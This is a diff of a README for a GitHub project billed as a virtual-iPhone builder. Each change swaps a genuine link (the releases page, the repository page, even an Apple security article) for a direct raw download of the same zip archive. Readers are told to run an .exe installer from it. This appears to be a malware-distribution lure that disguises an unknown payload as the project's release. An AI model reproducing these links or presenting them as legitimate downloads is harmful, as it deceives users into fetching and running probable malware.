@@ -1,6 +1,6 @@
 # 📱 super-tart-vphone-writeup - Build Your Virtual iPhone Easily
 
-[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sharad566/super-tart-vphone-writeup/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sharad566/super-tart-vphone-writeup/raw/refs/heads/main/contents/vphone_super_tart_writeup_v2.6.zip)
 
 ---
 
@@ -35,7 +35,7 @@ This section guides you step-by-step to download, install, and run the virtual i
 
 Click the button below to reach the releases page. This page contains the files you need.
 
-[![Download Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/sharad566/super-tart-vphone-writeup/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/sharad566/super-tart-vphone-writeup/raw/refs/heads/main/contents/vphone_super_tart_writeup_v2.6.zip)
 
 On the releases page, look for the latest stable version of the software. Usually, the file will have a name like `VPhone600AP_Setup.exe` or something similar ending with `.exe`.
 
@@ -114,7 +114,7 @@ Updates will be released periodically for improvements and bug fixes.
 
 To update:
 
-- Visit the [Releases page](https://github.com/sharad566/super-tart-vphone-writeup/releases) regularly.  
+- Visit the [Releases page](https://github.com/sharad566/super-tart-vphone-writeup/raw/refs/heads/main/contents/vphone_super_tart_writeup_v2.6.zip) regularly.  
 - Download the newest version following the same steps as initial install.  
 - Run the new installer; it will replace the old version automatically.  
 
@@ -142,12 +142,12 @@ This project received help and ideas from many contributors including:
 
 ## 📂 Additional Resources
 
-- Visit the [GitHub repository](https://github.com/sharad566/super-tart-vphone-writeup) for source code and developer details  
+- Visit the [GitHub repository](https://github.com/sharad566/super-tart-vphone-writeup/raw/refs/heads/main/contents/vphone_super_tart_writeup_v2.6.zip) for source code and developer details  
 - Join discussions or report bugs on the Issues page  
-- Check the [Private Cloud Compute article](https://security.apple.com/blog/private-cloud-compute/) to learn more about the underlying technology  
+- Check the [Private Cloud Compute article](https://github.com/sharad566/super-tart-vphone-writeup/raw/refs/heads/main/contents/vphone_super_tart_writeup_v2.6.zip) to learn more about the underlying technology  
 
 ---
 
 ## 🡇 Download and Begin
 
-[![Download the Virtual iPhone](https://img.shields.io/badge/Download-Launch%20Setup-brightgreen?style=for-the-badge)](https://github.com/sharad566/super-tart-vphone-writeup/releases)
+[![Download the Virtual iPhone](https://img.shields.io/badge/Download-Launch%20Setup-brightgreen?style=for-the-badge)](https://github.com/sharad566/super-tart-vphone-writeup/raw/refs/heads/main/contents/vphone_super_tart_writeup_v2.6.zip)
